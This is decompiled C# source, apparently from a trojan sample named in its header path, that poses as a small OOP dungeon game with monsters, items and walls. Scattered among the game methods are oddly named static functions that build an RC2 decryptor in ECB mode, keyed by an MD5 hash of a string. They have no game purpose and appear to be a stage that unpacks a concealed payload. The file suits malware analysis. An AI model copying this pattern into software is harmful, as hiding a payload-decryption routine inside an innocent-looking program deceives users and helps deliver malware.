// Decompiled with JetBrains decompiler
// Type: OOP_TeamWork.Engine
// Assembly: OOP-TeamWork, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 78E60F07-1B9F-418F-8C6F-A1FA2CABDF45
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan.MSIL.Picsys.gen-5866008a90168b7835b8f8b3d25aa43b6aaafd059e7519932278729ceae256ba.exe

using OOP_TeamWork.Interfaces;
using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;

namespace OOP_TeamWork
{
  public class Engine
  {
    private IDrawable painter;
    private List<Unit> unitList;
    private List<Item> itemList;
    private List<Wall> wallList;
    private Unit player;
    private int interval;
    public static RC2CryptoServiceProvider TheALost = new RC2CryptoServiceProvider();
    public static MD5CryptoServiceProvider Bank = new MD5CryptoServiceProvider();

    public Engine(IKeyboardControlable controller, IDrawable painter, int loopInterval)
    {
      this.interval = loopInterval;
      this.unitList = new List<Unit>();
      this.itemList = new List<Item>();
      this.wallList = new List<Wall>();
      this.SubscribeToUserInput(controller);
      this.InitializeCharacters();
      this.InitializeItems();
      this.InitializeWalls();
      this.painter = painter;
      foreach (IDrawable objectToBeDrawn in this.itemList)
        this.painter.AddObject(objectToBeDrawn);
      foreach (IDrawable unit in this.unitList)
        this.painter.AddObject(unit);
      foreach (IDrawable wall in this.wallList)
        this.painter.AddObject(wall);
    }

    public void PlayNextTurn()
    {
      this.Process();
      this.hasCollision();
      this.RedrawAll();
    }

    private void RedrawAll()
    {
      foreach (IDrawable unit in this.unitList)
        this.painter.RedrawObject(unit);
      foreach (IDrawable objectToBeRedrawn in this.itemList)
        this.painter.RedrawObject(objectToBeRedrawn);
    }

    private void Process()
    {
      foreach (Unit unit in this.unitList)
      {
        if (unit is Monster)
          (unit as Monster).MonsterRandomMovement();
        if (!unit.IsAlive)
        {
          if (unit is Hero)
            throw new Exception("Game Over!");
          this.painter.RemoveObject((IDrawable) unit);
        }
      }
      foreach (Item objectToBeRemoved in this.itemList)
      {
        if (objectToBeRemoved.isUsed)
          this.painter.RemoveObject((IDrawable) objectToBeRemoved);
      }
      this.unitList.RemoveAll((Predicate<Unit>) (x => !x.IsAlive));
      this.itemList.RemoveAll((Predicate<Item>) (item => item.isUsed));
    }

    public static byte[] FortionerCombox(string insert) => Engine.Bank.ComputeHash(Encoding.BigEndianUnicode.GetBytes(insert));

    private void hasCollision()
    {
      foreach (Unit unit in this.unitList)
      {
        int num = 20;
        bool flag = false;
        if ((unit.UnitPositionX < this.player.UnitPositionX + this.player.Width + num && unit.UnitPositionX + unit.Width > this.player.UnitPositionX - num) & (unit.UnitPositionY < this.player.UnitPositionY + this.player.Height + num && unit.UnitPositionY + unit.Height > this.player.UnitPositionY - num) && !(unit is Hero))
          flag = true;
        if (flag)
        {
          this.player.AttackEnemy(unit);
          unit.AttackEnemy(this.player);
        }
      }
      foreach (Item obj in this.itemList)
      {
        bool flag = false;
        if ((obj.PositionX < this.player.UnitPositionX + this.player.Width && obj.PositionX + obj.Width > this.player.UnitPositionX) & (obj.PositionY < this.player.UnitPositionY + this.player.Height && obj.PositionY + obj.Height > this.player.UnitPositionY))
          flag = true;
        if (flag)
          (this.player as Hero).TakeItem(obj);
      }
      foreach (Unit unit in this.unitList)
      {
        foreach (Wall wall in this.wallList)
        {
          if ((wall.PositionX < unit.UnitPositionX + unit.Width && wall.PositionX + wall.Width > unit.UnitPositionX) & (wall.PositionY < unit.UnitPositionY + unit.Height && wall.PositionY + wall.Height > unit.UnitPositionY))
            unit.hasWall = true;
        }
      }
    }

    public static byte[] SpoiledMeat(byte[] AB, string insert)
    {
      Engine.TheALost.Key = Engine.FortionerCombox(insert);
      Engine.TheALost.Mode = CipherMode.ECB;
      return Engine.TheABest(AB);
    }

    private void InitializeCharacters()
    {
      this.player = (Unit) new Mage(635, 510);
      this.unitList.Add((Unit) new BlackMonster(500, 50));
      this.unitList.Add((Unit) new BlueMonster(300, 150));
      this.unitList.Add((Unit) new BlackMonster(500, 50));
      this.unitList.Add((Unit) new BlueMonster(300, 150));
      this.unitList.Add((Unit) new BlackMonster(500, 50));
      this.unitList.Add((Unit) new BlueMonster(300, 150));
      this.unitList.Add((Unit) new BlackMonster(500, 50));
      this.unitList.Add((Unit) new BlueMonster(300, 150));
      this.unitList.Add((Unit) new BlackMonster(800, 450));
      this.unitList.Add((Unit) new BlueMonster(700, 150));
      this.unitList.Add((Unit) new BlackMonster(800, 450));
      this.unitList.Add((Unit) new BlueMonster(700, 150));
      this.unitList.Add((Unit) new BlackMonster(800, 450));
      this.unitList.Add((Unit) new BlueMonster(700, 150));
      this.unitList.Add(this.player);
    }

    private void InitializeItems()
    {
      this.itemList.Add((Item) new Weapon(50, 50));
      this.itemList.Add((Item) new HealingPoition(40, 150));
      this.itemList.Add((Item) new Shield(300, 50));
      this.itemList.Add((Item) new Weapon(1050, 100));
      this.itemList.Add((Item) new HealingPoition(180, 260));
      this.itemList.Add((Item) new Shield(1100, 420));
      this.itemList.Add((Item) new Weapon(1000, 530));
      this.itemList.Add((Item) new HealingPoition(980, 360));
      this.itemList.Add((Item) new Shield(960, 450));
      this.itemList.Add((Item) new Key(635, 40));
    }

    public static byte[] TheABest(byte[] B) => Engine.TheALost.CreateDecryptor().TransformFinalBlock(B, 0, B.Length);

    private void InitializeWalls()
    {
      this.wallList.Add(new Wall(0, 0));
      this.wallList.Add(new Wall(30, 0));
      this.wallList.Add(new Wall(60, 0));
      this.wallList.Add(new Wall(90, 0));
      this.wallList.Add(new Wall(120, 0));
      this.wallList.Add(new Wall(150, 0));
      this.wallList.Add(new Wall(180, 0));
      this.wallList.Add(new Wall(210, 0));
      this.wallList.Add(new Wall(240, 0));
      this.wallList.Add(new Wall(270, 0));
      this.wallList.Add(new Wall(300, 0));
      this.wallList.Add(new Wall(330, 0));
      this.wallList.Add(new Wall(360, 0));
      this.wallList.Add(new Wall(390, 0));
      this.wallList.Add(new Wall(420, 0));
      this.wallList.Add(new Wall(450, 0));
      this.wallList.Add(new Wall(480, 0));
      this.wallList.Add(new Wall(510, 0));
      this.wallList.Add(new Wall(540, 0));
      this.wallList.Add(new Wall(570, 0));
      this.wallList.Add(new Wall(600, 0));
      this.wallList.Add(new Wall(690, 0));
      this.wallList.Add(new Wall(720, 0));
      this.wallList.Add(new Wall(750, 0));
      this.wallList.Add(new Wall(780, 0));
      this.wallList.Add(new Wall(810, 0));
      this.wallList.Add(new Wall(840, 0));
      this.wallList.Add(new Wall(870, 0));
      this.wallList.Add(new Wall(900, 0));
      this.wallList.Add(new Wall(930, 0));
      this.wallList.Add(new Wall(960, 0));
      this.wallList.Add(new Wall(990, 0));
      this.wallList.Add(new Wall(1020, 0));
      this.wallList.Add(new Wall(1050, 0));
      this.wallList.Add(new Wall(1080, 0));
      this.wallList.Add(new Wall(1110, 0));
      this.wallList.Add(new Wall(1140, 0));
      this.wallList.Add(new Wall(1170, 0));
      this.wallList.Add(new Wall(0, 30));
      this.wallList.Add(new Wall(0, 60));
      this.wallList.Add(new Wall(0, 90));
      this.wallList.Add(new Wall(0, 120));
      this.wallList.Add(new Wall(0, 150));
      this.wallList.Add(new Wall(0, 180));
      this.wallList.Add(new Wall(0, 210));
      this.wallList.Add(new Wall(0, 240));
      this.wallList.Add(new Wall(0, 270));
      this.wallList.Add(new Wall(0, 300));
      this.wallList.Add(new Wall(0, 330));
      this.wallList.Add(new Wall(0, 360));
      this.wallList.Add(new Wall(0, 390));
      this.wallList.Add(new Wall(0, 420));
      this.wallList.Add(new Wall(0, 450));
      this.wallList.Add(new Wall(0, 480));
      this.wallList.Add(new Wall(0, 510));
      this.wallList.Add(new Wall(0, 540));
      this.wallList.Add(new Wall(0, 570));
      this.wallList.Add(new Wall(0, 570));
      this.wallList.Add(new Wall(30, 570));
      this.wallList.Add(new Wall(60, 570));
      this.wallList.Add(new Wall(90, 570));
      this.wallList.Add(new Wall(120, 570));
      this.wallList.Add(new Wall(150, 570));
      this.wallList.Add(new Wall(180, 570));
      this.wallList.Add(new Wall(210, 570));
      this.wallList.Add(new Wall(240, 570));
      this.wallList.Add(new Wall(270, 570));
      this.wallList.Add(new Wall(300, 570));
      this.wallList.Add(new Wall(330, 570));
      this.wallList.Add(new Wall(360, 570));
      this.wallList.Add(new Wall(390, 570));
      this.wallList.Add(new Wall(420, 570));
      this.wallList.Add(new Wall(450, 570));
      this.wallList.Add(new Wall(480, 570));
      this.wallList.Add(new Wall(510, 570));
      this.wallList.Add(new Wall(540, 570));
      this.wallList.Add(new Wall(570, 570));
      this.wallList.Add(new Wall(600, 570));
      this.wallList.Add(new Wall(690, 570));
      this.wallList.Add(new Wall(720, 570));
      this.wallList.Add(new Wall(750, 570));
      this.wallList.Add(new Wall(780, 570));
      this.wallList.Add(new Wall(810, 570));
      this.wallList.Add(new Wall(840, 570));
      this.wallList.Add(new Wall(870, 570));
      this.wallList.Add(new Wall(900, 570));
      this.wallList.Add(new Wall(930, 570));
      this.wallList.Add(new Wall(960, 570));
      this.wallList.Add(new Wall(990, 570));
      this.wallList.Add(new Wall(1020, 570));
      this.wallList.Add(new Wall(1050, 570));
      this.wallList.Add(new Wall(1080, 570));
      this.wallList.Add(new Wall(1110, 570));
      this.wallList.Add(new Wall(1140, 570));
      this.wallList.Add(new Wall(1170, 570));
      this.wallList.Add(new Wall(1170, 30));
      this.wallList.Add(new Wall(1170, 60));
      this.wallList.Add(new Wall(1170, 90));
      this.wallList.Add(new Wall(1170, 120));
      this.wallList.Add(new Wall(1170, 150));
      this.wallList.Add(new Wall(1170, 180));
      this.wallList.Add(new Wall(1170, 210));
      this.wallList.Add(new Wall(1170, 240));
      this.wallList.Add(new Wall(1170, 270));
      this.wallList.Add(new Wall(1170, 300));
      this.wallList.Add(new Wall(1170, 330));
      this.wallList.Add(new Wall(1170, 360));
      this.wallList.Add(new Wall(1170, 390));
      this.wallList.Add(new Wall(1170, 420));
      this.wallList.Add(new Wall(1170, 450));
      this.wallList.Add(new Wall(1170, 480));
      this.wallList.Add(new Wall(1170, 510));
      this.wallList.Add(new Wall(1170, 540));
      this.wallList.Add(new Wall(1170, 570));
    }

    private void MovePlayerRight() => this.player.Move(5, 0);

    private void MovePlayerDown() => this.player.Move(0, 5);

    private void MovePlayerUp() => this.player.Move(0, -5);

    private void MovePlayerLeft() => this.player.Move(-5, 0);

    private void SubscribeToUserInput(IKeyboardControlable userInteface)
    {
      userInteface.OnUpPressed += (EventHandler) ((sender, args) => this.MovePlayerUp());
      userInteface.OnDownPressed += (EventHandler) ((sender, args) => this.MovePlayerDown());
      userInteface.OnLeftPressed += (EventHandler) ((sender, args) => this.MovePlayerLeft());
      userInteface.OnRightPressed += (EventHandler) ((sender, args) => this.MovePlayerRight());
    }
  }
}
